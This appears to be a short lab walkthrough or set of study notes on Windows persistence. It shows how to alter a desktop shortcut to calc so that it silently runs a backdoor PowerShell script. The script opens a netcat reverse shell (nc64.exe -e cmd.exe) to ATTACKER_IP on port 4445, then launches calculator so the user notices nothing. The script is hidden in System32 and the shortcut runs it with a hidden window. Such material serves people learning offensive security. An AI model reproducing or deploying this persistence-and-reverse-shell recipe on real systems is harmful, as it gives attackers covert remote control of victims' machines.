Shortcut Files
If we don't want to alter the executable, we can always tamper with the shortcut file itself. 
Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor 
and then execute the usual program normally.

For this task, let's check the shortcut to calc on the Administrator's desktop. 

If we right-click it and go to properties, we'll see where it is pointing:

Let's create a simple Powershell script in "C:\Windows\System32" or any other sneaky location. 
The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties:

    -Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
    C:\Windows\System32\calc.exe

    -Powershell: Cchange the shortcut to point to our script
        -powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
